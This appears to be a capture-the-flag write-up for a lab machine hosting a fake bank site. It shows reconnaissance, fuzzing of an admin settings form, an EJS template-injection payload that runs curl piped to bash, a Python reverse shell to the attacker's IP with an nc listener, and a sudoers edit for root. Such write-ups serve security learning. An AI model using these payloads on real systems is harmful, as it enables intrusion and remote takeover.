...
![whitrose card](whiterose.webp){: width="300" height="300" }
...
```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.81.186.131
Nmap scan report for 10.81.186.131
...
| ssh-rsa 
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNMBr/zXjVQItMqdVH12/sZ3rIt2XFsPWRCy47InUVg8Q9SVFkOW2LAi1UStP4A4W8yA8hW+1wJaEFP9ffs=
...
Visiting `http://10.81.186.131/` redirects us to `http://cyprusbank.thm/`, so let's add it to our hosts file:

```plaintext
10.81.186.131 cyprusbank.thm
```
{: file="/etc/hosts" }

Afterward, visiting `http://cyprusbank.thm/` displays only a maintenance message.

![Web 80 Index](web_cyprusbank.webp){: width="1200" height="600" }
...
```console
$ ffuf -u 'http://cyprusbank.thm/' -H "Host: FUZZ.cyprusbank.thm" -w ~/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt -mc all -t 100 -ic -fw 1
...
________________________________________________
 ...
 :: Wordlist         : FUZZ: /home/iam/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt
...
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 274ms]
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 362ms]
:: Progress: [19964/19964] :: Job [1/1] :: 424 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
...
![Web 80 Admin Index Two](web_cyprusbank4.webp){: width="1200" height="600" }
...
![Web 80 Admin Messages Two](web_cyprusbank7.webp){: width="1200" height="600" }
...
![Web 80 Admin Messages Three](web_cyprusbank8.webp){: width="1200" height="600" }
...
![Web 80 Admin Index Three](web_cyprusbank9.webp){: width="1200" height="600" }

We also gain access to the **Settings** page at `http://admin.cyprusbank.thm/settings`.

![Web 80 Admin Settings Two](web_cyprusbank10.webp){: width="1200" height="600" }

Testing the form, it appears to allow us to change the passwords for customers and displays the new password.

![Web 80 Admin Settings Three](web_cyprusbank11.webp){: width="1200" height="600" }
...
```console
$ ffuf -u 'http://admin.cyprusbank.thm/settings' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: connect.sid=s%3Ashh_dF0UCb6EMQtpzAXsd43K9KWewlK-.LarStLrrPAYX0mnpr5C1onjaN8fuPkNSHJBCn1hfic0' -mc all -d 'name=test&password=test&FUZZ=test' -w ~/SecLists-master/Discovery/Web-Content/raft-small-words-lowercase.txt -t 100 -fs 2098
...
________________________________________________
 ...
 :: Wordlist         : FUZZ: /home/iam/SecLists-master/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: connect.sid=s%3Ashh_dF0UCb6EMQtpzAXsd43K9KWewlK-.LarStLrrPAYX0mnpr5C1onjaN8fuPkNSHJBCn1hfic0
...
password                [Status: 200, Size: 2103, Words: 427, Lines: 59, Duration: 543ms]
include                 [Status: 500, Size: 1388, Words: 80, Lines: 11, Duration: 632ms]
error                   [Status: 200, Size: 1467, Words: 281, Lines: 49, Duration: 267ms]
message                 [Status: 200, Size: 2159, Words: 444, Lines: 61, Duration: 306ms]
client                  [Status: 500, Size: 1399, Words: 80, Lines: 11, Duration: 335ms]
async                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 262ms]
...
![Web 80 Admin Settings Four](burp_clientpar.webp){: width="1000" height="500" }
...
![Web 80 Admin Settings Five](burp_asyncpar.webp){: width="1000" height="500" }
...
![Web 80 Admin Settings Six](burp_delimiter.webp){: width="1000" height="500" }
...
```
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 192.168.134.168');s
```
{: .wrap }


```console
10.81.186.131  - - [16/Dec/2025 05:03:44] "GET / HTTP/1.1" 200 -
10.81.186.131  - - [16/Dec/2025 05:03:44] "GET / HTTP/1.1" 200 -
10.81.186.131  - - [16/Dec/2025 05:03:45] "GET / HTTP/1.1" 200 -
```
...
```console
$ cat index.html                        
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.134.168",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'             
...
```console
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 192.168.134.168:3000/index.html|bash');s
```
{: .wrap }

Sending our payload, we can see that the server hangs, and we receive a shell as the `web` user.

![Web 80 Admin Settings Eight](burp_payload.webp){: width="1000" height="500" }

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.134.168] from (UNKNOWN) [10.81.186.131] 49286
...
![Nano Sudoers File](nano_sudoers.webp){: width="1000" height="500" }

Now, by making the addition of `web ALL=(ALL) NOPASSWD: ALL` to the file, we can grant our current user full `sudo` privileges.

![Nano Sudoers File Two](nano_sudoers2.webp){: width="1000" height="500" }
